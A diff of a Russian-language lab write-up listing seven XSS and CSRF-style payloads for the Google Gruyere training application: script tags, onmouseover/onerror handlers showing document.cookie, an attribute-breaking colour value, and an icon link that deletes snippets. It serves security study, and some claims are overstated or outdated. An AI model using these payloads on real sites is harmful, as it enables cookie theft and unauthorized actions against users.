@@ -1,11 +1,20 @@
-# Payloads для gruyere
+Payload 1:
+На странице по ссылке https://example.com/example можно подставить в параметр example следующий пейлоуд: <script>alert(document.cookie)</script>. Это создаст Reflected XSS-инъекцию в элементе <div id="search-query-param">, позволяя получить куки пользователя.
 
-## Payload 1
+Payload 2:
+При создании нового сниппета можно добавить следующий код: <a onmouseover="alert(document.cookie)" href="#">Текст</a>. Этот пейлоуд вызовет показ куков при наведении на ссылку.
 
-При переходе по ссылке `https://google-gruyere.appspot.com/437011974374534003250656556701248906630/newsnippet.gtl`. В поле ввода "Add a new snippet." можно вставить скрипт <div onClick="alert("1")"></div>
+Payload 3:
+При изменении цвета профиля можно указать следующий код: black' onmouseover='alert(682). Это вызовет предупреждение при наведении на цвет профиля.
 
-## Payload 2
+Payload 4:
+При изменении профиля можно указать ссылку в поле для иконки: https://google-gruyere.appspot.com/509870841862400053734264954502968465848/deletesnippet?index=0. Данная ссылка позволяет удалить сниппет, используя уязвимость в URL.
 
-При переходе по ссылке `https://google-gruyere.appspot.com/437011974374534003250656556701248906630/newsnippet.gtl`. В поле ввода "Add a new snippet." можно вставить скрипт (1') <a ONMOUSEOVER="alert(1)" href="#">прочитайте это!</a>
-...
+Payload 5:
+В поле "Private Snippet" можно вставить HTML-код <img src="x" onerror="alert('XSS')">. Этот код вызовет предупреждение на странице, активируя XSS-инъекцию.
 
+Payload 6:
+При изменении иконки профиля можно вставить следующий HTML-тег: <img src="javascript:alert(document.cookie);">. Это вызовет сообщение с куками пользователя.
+
+Payload 7:
+При указании ссылки на главную страницу в поле профиля можно вставить код <img src="x" onerror="alert(1)">. Этот код создаст XSS-инъекцию, выводя предупреждение при загрузке страницы.
